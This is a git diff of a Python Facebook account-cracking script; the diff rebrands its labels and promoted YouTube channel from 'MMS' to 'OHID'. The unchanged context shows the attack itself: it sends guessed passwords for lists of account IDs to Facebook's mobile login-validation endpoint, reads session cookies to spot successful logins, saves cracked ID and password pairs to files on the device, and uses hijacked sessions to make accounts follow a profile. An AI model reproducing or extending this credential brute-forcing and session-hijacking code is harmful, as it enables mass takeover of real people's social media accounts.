@@ -324,17 +324,17 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m[M͓̽M͓̽S͓̽-OK] {idf} * {pw}')
+				print( f'\r\x1b[1;91m[OHID-OK] {idf} * {pw}')
 				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;91m [M͓̽M͓̽S͓̽-OK] {idf} * {pw}')
+				print(f'\r\x1b[1;91m [OHID-OK] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/M͓̽M͓̽S͓̽-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/OHID-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -348,7 +348,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[M͓̽M͓̽S͓̽] %s/%s  [OK] %s |  [CP]:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[OHiD] %s/%s  [OK] %s |  [CP]:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -369,10 +369,10 @@ def free(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [M͓̽M͓̽S͓̽-OK] {idf} * {pw}')
+				print(f'\r\x1b[1;92m [OHID-OK] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/M͓̽M͓̽S͓̽-OK','a').write('%s\n' % wrt)
+				open('/sdcard/OHID-OK','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -430,7 +430,7 @@ class Main:
 			print("    Thanks♥️")
 			exit()
 		elif Baloch in ["1", "01"]:
-			os.system("xdg-open https://youtube.com/@termuxmasud-tech")
+			os.system("xdg-open https://youtube.com/@ohid_yt")
 			print("")
 			time.sleep(3.0)
 			print("\033[1;37m    CHECKING APPROVAL ")
@@ -438,7 +438,7 @@ class Main:
 			input("\n\033[1;37m TYPE THE OWNER FACEBOOK ACCOUNT NAME \033[1;37m")
 			time.sleep(3.1)
 			print("")
-			print("\033[1;32m WELCOME TO *M͓̽M͓̽S͓̽*  TOOLS")
+			print("\033[1;32m WELCOME TO *Lw Ohid YT's*  TOOLS")
 			time.sleep(3.0)
 			os.system("clear")
 		print(logo)
